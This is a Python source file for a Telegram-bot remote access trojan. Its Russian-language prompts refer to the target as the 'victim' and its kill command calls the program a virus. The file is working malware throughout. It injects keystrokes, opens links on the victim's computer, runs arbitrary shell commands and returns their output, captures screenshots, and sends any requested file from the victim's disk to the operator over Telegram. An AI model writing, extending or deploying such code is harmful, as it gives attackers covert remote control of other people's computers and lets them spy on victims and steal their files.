import telebot
import keyboard
import webbrowser
import os
import pyautogui
import varss


TOKEN = varss.TOKEN

bot = telebot.TeleBot(TOKEN)



@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id,'список команд \n /keyhack ввод на клавиатуре жертвы \n /webhack открытия сайтов на ПК жертвы \n /screenshot создания скриншота \n /installfile скачать файл с пк жертвы \n /cmdhack ввод команд на пк жертвы')

@bot.message_handler(commands=['keyhack'])
def usrinp(message):
    bot.send_message(message.chat.id,'keyhack run введите текст для ввода')
    bot.register_next_step_handler(message,usrinp2)
def usrinp2(message):   
    keyboard.write(message.text)
    keyboard.press_and_release("Enter")

@bot.message_handler(commands=['webhack'])
def webhck(message):
    bot.send_message(message.chat.id,'отправьте ссылку для открытия у жертвы')
    bot.register_next_step_handler(message,webhck2)
def webhck2(message):
    webbrowser.open(message.text)
    
@bot.message_handler(commands=['cmdhack'])
def cmdhck(message):
    bot.send_message(message.chat.id,'введите команду которую хотите запустить на пк жертвы')
    bot.register_next_step_handler(message,cmdhck2)
def cmdhck2(message):
    a = os.popen(message.text).read()
    bot.send_message(message.chat.id,f'команда запущена \n {a}')
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    image = pyautogui.screenshot()
    image.save('screenshot.png')
    imagef = open('screenshot.png','rb')
    bot.send_photo(message.chat.id,imagef)
    imagef.close
@bot.message_handler(commands=['installfile'])
def instlfl(message):
    bot.send_message(message.chat.id,'отправьте путь к файлу который хотите скачать')
    bot.register_next_step_handler(message,installfl2)
def installfl2(message):
    try:
        f = open(message.text,'rb')
        bot.send_document(message.chat.id,f)
    except:
        bot.send_message(message.chat.id,'не удалось найти файл')

@bot.message_handler(commands=['uploadfile'])
def upldfile(message):
    pass
@bot.message_handler(commands=['kill'])
def dead(message):
    bot.send_message(message.chat.id, "вирус завершил работу")
    quit()


bot.polling()
